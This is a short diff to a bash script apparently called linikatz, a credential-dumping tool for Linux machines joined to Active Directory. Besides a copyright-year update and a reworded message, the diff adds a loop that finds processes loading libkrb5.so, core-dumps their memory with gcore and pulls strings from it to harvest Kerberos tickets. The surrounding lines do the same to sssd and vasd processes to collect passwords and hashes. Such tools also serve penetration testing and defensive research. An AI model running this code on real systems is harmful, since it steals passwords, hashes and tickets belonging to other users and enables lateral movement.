@@ -1,5 +1,5 @@
 #!/bin/bash
-# Copyright (c) 2015-2018, Cisco International Ltd
+# Copyright (c) 2015-2021, Cisco International Ltd
 # 
 # Redistribution and use in source and binary forms, with or without
 # modification, are permitted provided that the following conditions are met:
@@ -116,7 +116,7 @@ do
 		fi
 	fi
 done
-printf "I: In memory, plain text or stored as a hash\n"
+printf "I: In memory passwords, plain text or stored as a hash\n"
 pgrep sss | while read processid
 do
         gcore -o "sss.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
@@ -126,4 +126,10 @@ pgrep vasd | while read processid
 do
         gcore -o "vas.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
         strings "vas.$$.${r}.${processid}" | sort | uniq >>strings."linikatz.$$.${r}"
+done
+printf "I: In memory tickets\n"
+grep libkrb5.so /proc/[0-9]*/maps 2>/dev/null | cut -f 3 -d "/" | while read processid
+do
+        gcore -o "krb5.$$.${r}" "${processid}" 2>/dev/null >>"strings.linikatz.$$.${r}"
+        strings "krb5.$$.${r}.${processid}" | sort | uniq >>"strings.linikatz.$$.${r}"
 done
